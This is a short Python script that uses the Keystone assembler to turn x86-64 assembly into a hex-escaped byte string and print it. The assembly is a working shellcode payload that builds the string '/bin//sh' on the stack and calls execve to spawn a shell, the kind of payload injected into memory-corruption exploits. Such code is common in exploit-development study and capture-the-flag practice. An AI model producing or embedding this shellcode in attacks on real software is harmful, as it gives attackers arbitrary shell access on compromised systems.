from keystone import *

CODE = """

start:
    xor esi,esi
    mov rbx, 0x68732f2f6e69622f
    push rsi
    push rbx
    push rsp
    pop rdi
    push 0x3b
    pop rax
    xor edx,edx
    syscall
"""

ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, count = ks.asm(CODE)
instructions = ""
for dec in encoding:
    instructions += "\\x{0:02x}".format(int(dec)).rstrip("\n")

print('0pcodes = ("' + instructions + '")')
